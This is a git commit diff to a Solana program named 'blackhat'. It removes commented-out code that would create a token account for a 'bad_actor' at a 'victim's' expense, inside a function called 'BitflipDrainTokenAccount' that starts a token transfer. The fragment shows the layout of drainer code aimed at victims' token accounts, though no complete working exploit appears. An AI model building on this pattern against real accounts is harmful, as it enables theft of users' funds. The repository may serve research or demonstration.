2df18af33caa5aaae6fb808bdbec0814c441f9c5
Jac0xb <jacob@rektdefi.net>
2024-11-16 15:46:06 -0500

    Remove commented code

--- programs/blackhat/program/src/lib.rs
+++ programs/blackhat/program/src/lib.rs
@@ -96,21 +96,6 @@ pub mod blackhat {
         ctx: Context<'_, '_, '_, 'info, BitflipDrainTokenAccount<'info>>,
     ) -> Result<()> {
         if !ctx.accounts.bit_flipper.data_is_empty() {
-            // if ctx.accounts.bad_actor_ata.data_is_empty() {
-            //     let cpi_ctx: CpiContext<'_, '_, '_, '_, associated_token::Create<'_>> =
-            //         CpiContext::new(
-            //             ctx.accounts.associated_token_program.to_account_info(),
-            //             associated_token::Create {
-            //                 payer: ctx.accounts.victim.to_account_info(),
-            //                 associated_token: ctx.accounts.bad_actor_ata.to_account_info(),
-            //                 mint: ctx.accounts.mint.to_account_info(),
-            //                 authority: ctx.accounts.bad_actor.to_account_info(),
-            //                 token_program: ctx.accounts.token_program.to_account_info(),
-            //                 system_program: ctx.accounts.system_program.to_account_info(),
-            //             },
-            //         );
-            // }
-
             let cpi_ctx = CpiContext::new(
                 ctx.accounts.system_program.to_account_info(),
                 token::Transfer {
